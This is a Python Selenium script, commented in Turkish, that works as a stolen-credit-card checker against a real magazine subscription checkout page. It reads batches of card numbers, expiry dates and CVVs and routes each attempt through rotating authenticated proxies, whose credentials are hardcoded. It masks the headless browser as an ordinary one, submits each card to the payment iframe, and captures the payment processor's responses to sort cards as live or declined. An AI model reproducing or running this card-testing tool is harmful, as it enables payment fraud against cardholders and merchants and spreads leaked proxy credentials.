import json
import time
import sys
import os
import tempfile
import zipfile
import atexit

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options

# ============================================================
# DEBUG
# ============================================================
_global_driver = None

def _save_debug_on_exit():
    global _global_driver
    if _global_driver is None:
        return
    try:
        _global_driver.save_screenshot("/tmp/resin_debug.png")
        with open("/tmp/resin_debug.html", "w", encoding="utf-8") as f:
            f.write(_global_driver.page_source)
        print("  [atexit] Debug kaydedildi: /tmp/resin_debug.*", file=sys.stderr)
    except Exception as e:
        print(f"  [atexit] Debug kaydedilemedi: {e}", file=sys.stderr)

atexit.register(_save_debug_on_exit)


# ============================================================
# FALLBACK PROXY LIST (backend proxies.txt yoksa)
# ============================================================
FALLBACK_PROXIES = [
    "31.59.20.176:6754:jokerpayment:Ak1f1987",
    "45.38.107.97:6014:jokerpayment:Ak1f1987",
    "198.105.121.200:6462:jokerpayment:Ak1f1987",
    "64.137.96.74:6641:jokerpayment:Ak1f1987",
    "198.23.243.226:6361:jokerpayment:Ak1f1987",
]

URL = (
    "https://sub.cigaraficionado.com/pubs/M5/CGA/"
    "AMG-designed-page_CGA-ISO_1-Year-for-2995.jsp"
    "?cds_page_id=278585&cds_mag_code=CGA"
    "&id=1789949593621&lsid=62631913136073678&vid=1"
)

RESPONSE_URL_KEYWORDS = [
    "paymentcapture.resin.com",
    "payments-api.cloud.buysub.com",
    "mshanken.cloud.buysub.com",
    "buysub.com/pw",
    "resin.com/api",
    "api.resin.com",
    "checkout.",
    "payment.",
    "transaction",
    "/charge",
    "/authorize",
    "/capture",
]

SKIP_MIMES = {
    "script", "stylesheet", "image", "font", "media",
    "text/css", "application/javascript",
    "image/png", "image/jpeg", "image/svg+xml", "image/x-icon",
}

SKIP_EXTENSIONS = (
    ".js", ".css", ".png", ".jpg", ".jpeg", ".gif",
    ".svg", ".woff", ".woff2", ".ttf", ".ico", ".map",
)


# ============================================================
# CARD PARSER
# ============================================================
def parse_card_line(line):
    parts = [p.strip() for p in line.split("|")]
    if len(parts) < 3:
        return None

    pan = parts[0].replace(" ", "")

    # exp: "MM/YY" veya "MM/YYYY" veya "MM" + "YY"
    if "/" in parts[1]:
        m, y = parts[1].split("/")
        exp_month = m.zfill(2)
        exp_year = y if len(y) == 4 else "20" + y
        cvv_idx = 2
    else:
        exp_month = parts[1].zfill(2)
        exp_year = parts[2] if len(parts[2]) == 4 else "20" + parts[2]
        cvv_idx = 3

    cvv = parts[cvv_idx] if len(parts) > cvv_idx else ""

    return {
        "pan": pan,
        "exp_month": exp_month,
        "exp_year": exp_year,
        "cvv": cvv,
        "first_name": parts[cvv_idx + 1] if len(parts) > cvv_idx + 1 else "Test",
        "last_name": parts[cvv_idx + 2] if len(parts) > cvv_idx + 2 else "User",
        "address": parts[cvv_idx + 3] if len(parts) > cvv_idx + 3 else "123 Main St",
        "city": parts[cvv_idx + 4] if len(parts) > cvv_idx + 4 else "New York",
        "state": parts[cvv_idx + 5] if len(parts) > cvv_idx + 5 else "NY",
        "zip": parts[cvv_idx + 6] if len(parts) > cvv_idx + 6 else "10001",
        "phone": parts[cvv_idx + 7] if len(parts) > cvv_idx + 7 else "5551234567",
        "email": parts[cvv_idx + 8] if len(parts) > cvv_idx + 8 else "test@example.com",
        "country": parts[cvv_idx + 9] if len(parts) > cvv_idx + 9 else "US",
    }


# ============================================================
# PROXY HELPER
# ============================================================
def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(":")
    if len(parts) != 4:
        return None
    return {"host": parts[0], "port": parts[1], "user": parts[2], "pass": parts[3]}


def load_proxies_from_file():
    """Backend'den geçici olarak proxy listesi al (stdin'den geldiyse kullan)"""
    return []


def create_proxy_auth_extension(proxy):
    manifest_json = """
    {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Chrome Proxy",
        "permissions": [
            "proxy", "tabs", "unlimitedStorage", "storage",
            "<all_urls>", "webRequest", "webRequestBlocking"
        ],
        "background": { "scripts": ["background.js"] },
        "minimum_chrome_version": "22.0.0"
    }
    """

    background_js = """
    var config = {
        mode: "fixed_servers",
        rules: {
            singleProxy: {
                scheme: "http",
                host: "%s",
                port: parseInt(%s)
            },
            bypassList: ["localhost"]
        }
    };
    chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
    function callbackFn(details) {
        return {
            authCredentials: {
                username: "%s",
                password: "%s"
            }
        };
    }
    chrome.webRequest.onAuthRequired.addListener(
        callbackFn,
        {urls: ["<all_urls>"]},
        ['blocking']
    );
    """ % (proxy["host"], proxy["port"], proxy["user"], proxy["pass"])

    ext_dir = tempfile.mkdtemp()
    ext_path = os.path.join(ext_dir, "proxy_auth_plugin.zip")
    with zipfile.ZipFile(ext_path, 'w') as zp:
        zp.writestr("manifest.json", manifest_json)
        zp.writestr("background.js", background_js)
    return ext_path


# ============================================================
# DOM HELPERS
# ============================================================
def try_fill(driver, selectors, value, timeout=2):
    for sel in selectors:
        try:
            el = WebDriverWait(driver, timeout).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, sel))
            )
            el.clear()
            el.send_keys(value)
            return True
        except:
            continue
    return False


def wait_for_iframe_inputs(driver, timeout=30):
    print("  iframe içeriği yüklenmesi bekleniyor...", file=sys.stderr)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            inputs = driver.find_elements(By.TAG_NAME, "input")
            if len(inputs) >= 2:
                print(f"  iframe içinde {len(inputs)} input bulundu", file=sys.stderr)
                return True
            time.sleep(1)
        except:
            time.sleep(1)
    print("  iframe input timeout", file=sys.stderr)
    return False


def check_dom_errors(driver):
    error_selectors = [
        "#cds_payment_component_error",
        ".error-message",
        ".alert-error",
        "[role='alert']",
        ".payment-error",
    ]
    for sel in error_selectors:
        try:
            el = driver.find_element(By.CSS_SELECTOR, sel)
            if el and el.text.strip():
                return {"has_error": True, "error_text": el.text.strip()}
        except:
            continue
    return {"has_error": False, "error_text": None}


def check_dom_success(driver):
    success_keywords = [
        "thank you",
        "order has been received",
        "success",
        "approved",
        "confirmation",
    ]
    try:
        body_text = driver.find_element(By.TAG_NAME, "body").text.lower()
        for kw in success_keywords:
            if kw in body_text:
                return {"has_success": True, "keyword": kw}
    except:
        pass
    return {"has_success": False, "keyword": None}


# ============================================================
# NETWORK FILTER
# ============================================================
def should_skip_url(url, mime):
    if mime and mime.lower() in SKIP_MIMES:
        return True
    url_lower = url.lower()
    for ext in SKIP_EXTENSIONS:
        if url_lower.endswith(ext):
            return True
    return False


def is_payment_response(url):
    url_lower = url.lower()
    return any(kw.lower() in url_lower for kw in RESPONSE_URL_KEYWORDS)


# ============================================================
# CHECK CARD
# ============================================================
def check_card(card_line, proxy_str=None):
    card = parse_card_line(card_line)
    if not card:
        return {"error": "invalid_card_format"}

    proxy = parse_proxy(proxy_str) if proxy_str else None

    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument(
        "--user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )

    # Proxy varsa extension ekle
    if proxy:
        try:
            ext_path = create_proxy_auth_extension(proxy)
            options.add_extension(ext_path)
            print(f"  Proxy: {proxy['host']}:{proxy['port']}", file=sys.stderr)
        except Exception as e:
            print(f"  Proxy extension hatası: {e}", file=sys.stderr)

    options.set_capability("goog:loggingPrefs", {"performance": "ALL"})

    driver = None
    try:
        driver = webdriver.Chrome(options=options)
        _global_driver = driver
        driver.get(URL)

        print(f"  Sayfa yüklendi: {driver.title}", file=sys.stderr)
        time.sleep(5)

        # ------------------------------------------------------------
        # 1. ANA SAYFA BILLING
        # ------------------------------------------------------------
        billing_filled = {
            "cds_name": try_fill(driver, [
                'input[name="cds_name"]', 'input#Full-Name'
            ], f"{card['first_name']} {card['last_name']}"),
            "cds_email": try_fill(driver, [
                'input[name="cds_email"]', 'input#Email', 'input[type="email"]'
            ], card["email"]),
            "cds_address_1": try_fill(driver, [
                'input[name="cds_address_1"]', 'input#Address-line'
            ], card["address"]),
            "cds_city": try_fill(driver, [
                'input[name="cds_city"]', 'input#City'
            ], card["city"]),
            "cds_state": try_fill(driver, [
                'input[name="cds_state"]', 'input#State'
            ], card["state"]),
            "cds_zip": try_fill(driver, [
                'input[name="cds_zip"]', 'input#Zipcode'
            ], card["zip"]),
        }
        billing_count = sum(1 for v in billing_filled.values() if v)
        print(f"  Billing alanları (ana sayfa): {billing_count}/6", file=sys.stderr)

        # ------------------------------------------------------------
        # 2. RESIN IFRAME
        # ------------------------------------------------------------
        time.sleep(2)
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        print(f"  {len(iframes)} iframe bulundu", file=sys.stderr)

        iframe_found = False
        for ifr in iframes:
            try:
                src = ifr.get_attribute("src") or ""
                if any(k in src.lower() for k in ["resin.com", "paymentcapture"]):
                    driver.switch_to.frame(ifr)
                    print(f"  iframe'e geçildi: {src[:80]}", file=sys.stderr)
                    iframe_found = True
                    break
            except:
                continue

        if iframe_found:
            wait_for_iframe_inputs(driver, timeout=30)

        # ------------------------------------------------------------
        # 3. KART NO + EXP + CVV
        # ------------------------------------------------------------
        card_filled = try_fill(driver, [
            'input[name="card-number"]',
            'input[id="cc-number"]',
            'input[autocomplete="cc-number"]',
            'input[placeholder*="1234"]',
        ], card["pan"])
        print(f"    [{'OK' if card_filled else '--'}] card_number", file=sys.stderr)

        time.sleep(1)

        exp_filled = try_fill(driver, [
            'input[name="exp-date"]',
            'input[id="exp-date"]',
            'input[autocomplete="cc-exp"]',
            'input[placeholder*="MM / YY"]',
        ], f"{card['exp_month']}/{card['exp_year'][-2:]}")
        print(f"    [{'OK' if exp_filled else '--'}] exp_date", file=sys.stderr)

        if card["cvv"]:
            cvv_filled = try_fill(driver, [
                'input[name="cvv"]',
                'input[name="cvc"]',
                'input[id="cvc"]',
                'input[autocomplete="cc-csc"]',
                'input[placeholder*="CVC"]',
            ], card["cvv"])
            print(f"    [{'OK' if cvv_filled else '--'}] cvv", file=sys.stderr)

        # ------------------------------------------------------------
        # 4. SUBMIT
        # ------------------------------------------------------------
        submit_button = None
        for sel in ['button#Submit', 'button[name="send"]', 'button[type="submit"]']:
            try:
                submit_button = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, sel))
                )
                if submit_button:
                    break
            except:
                continue

        if not submit_button:
            try:
                driver.switch_to.default_content()
                time.sleep(1)
                for sel in ['button#Submit', 'button[name="send"]', 'button[type="submit"]']:
                    try:
                        submit_button = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, sel))
                        )
                        if submit_button:
                            break
                    except:
                        continue
            except:
                pass

        if not submit_button:
            print("  Submit butonu bulunamadı!", file=sys.stderr)
            return {"error": "submit_button_not_found"}

        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", submit_button)
        time.sleep(0.5)
        try:
            submit_button.click()
        except:
            driver.execute_script("arguments[0].click();", submit_button)

        print("  Submit butonuna tıklandı", file=sys.stderr)

        # ------------------------------------------------------------
        # 5. YANIT BEKLE
        # ------------------------------------------------------------
        try:
            driver.switch_to.default_content()
        except:
            pass

        deadline = time.time() + 60
        payment_response = None
        dom_error = None

        while time.time() < deadline:
            # 5a. Network logları
            try:
                logs = driver.get_log("performance")
            except:
                logs = []

            for item in logs:
                try:
                    msg = json.loads(item["message"])["message"]
                except:
                    continue

                if msg["method"] == "Network.responseReceived":
                    resp = msg["params"]["response"]
                    url = resp.get("url", "")
                    mime = resp.get("mimeType", "")

                    if should_skip_url(url, mime):
                        continue

                    if is_payment_response(url):
                        req_id = msg["params"]["requestId"]
                        try:
                            body = driver.execute_cdp_cmd(
                                "Network.getResponseBody", {"requestId": req_id}
                            )
                            payment_response = {
                                "url": url,
                                "http_status": resp.get("status"),
                                "body": body.get("body", "")[:3000],
                            }
                            print(f"  ✅ Yanıt yakalandı: {url[:80]}", file=sys.stderr)
                            break
                        except Exception as e:
                            print(f"  ⚠️ Body okunamadı: {e}", file=sys.stderr)

            if payment_response:
                break

            # 5b. DOM hata
            dom_err = check_dom_errors(driver)
            if dom_err["has_error"]:
                dom_error = dom_err["error_text"]
                print(f"  ⚠️ DOM hata: {dom_error[:100]}", file=sys.stderr)

            # 5c. DOM başarı
            dom_ok = check_dom_success(driver)
            if dom_ok["has_success"]:
                print(f"  ✅ DOM başarı: {dom_ok['keyword']}", file=sys.stderr)
                return {
                    "status": "response",
                    "http_status": 200,
                    "body": f"DOM_SUCCESS:{dom_ok['keyword']}",
                    "url": "DOM",
                }

            time.sleep(1)

        # ------------------------------------------------------------
        # 6. SONUÇ
        # ------------------------------------------------------------
        if payment_response:
            return {"status": "response", **payment_response}

        if dom_error:
            return {
                "status": "declined",
                "reason": dom_error[:100],
                "url": "DOM",
            }

        print("  ❌ Zaman aşımı: yanıt gelmedi", file=sys.stderr)
        return {"status": "unknown", "reason": "no_response"}

    except Exception as e:
        print(f"  💥 Hata: {e}", file=sys.stderr)
        return {"error": str(e)}
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    try:
        input_data = json.loads(sys.stdin.read())
        cards = input_data.get("cards", [])
        proxies = input_data.get("proxies", [])

        results = []
        for i, card in enumerate(cards):
            proxy_str = proxies[i] if i < len(proxies) else None

            print(f"[{i+1}/{len(cards)}] Checking {card[:30]}...", file=sys.stderr)
            if proxy_str:
                print(f"  Proxy: {proxy_str.split(':')[0]}", file=sys.stderr)

            result = check_card(card, proxy_str)
            results.append({
                "card": card,
                "result": result,
                "proxy": proxy_str,
            })
            time.sleep(3)

        print(json.dumps({"results": results}, ensure_ascii=False))

    except Exception as e:
        print(json.dumps({
            "results": [],
            "error": str(e)
        }), file=sys.stdout)
        sys.exit(1)